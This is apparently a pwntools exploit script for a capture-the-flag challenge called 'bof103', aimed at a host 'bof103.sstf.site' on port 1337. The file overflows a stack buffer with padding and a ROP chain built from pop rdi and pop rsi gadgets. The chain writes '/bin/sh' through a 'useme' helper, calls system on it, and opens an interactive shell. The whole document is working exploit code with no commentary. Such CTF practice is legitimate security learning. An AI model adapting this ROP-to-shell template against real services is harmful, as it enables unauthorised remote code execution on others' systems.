#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof103")


def start(argv=[], *a, **kw):
    # nc bof103.sstf.site 1337
    host = args.HOST or 'bof103.sstf.site'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x10
pop_rdi = 0x00400723
pop_rsi = 0x004006b8

payload = b"A" * pad
payload += p64(elf.bss(0x200))
payload += flat(pop_rdi, b"/bin/sh\x00")
payload += flat(pop_rsi, 1)
payload += p64(elf.symbols["useme"])
payload += flat(pop_rdi, elf.symbols["key"])
payload += p64(elf.plt["system"])

io.sendlineafter(b"Name > ", payload)

io.interactive()
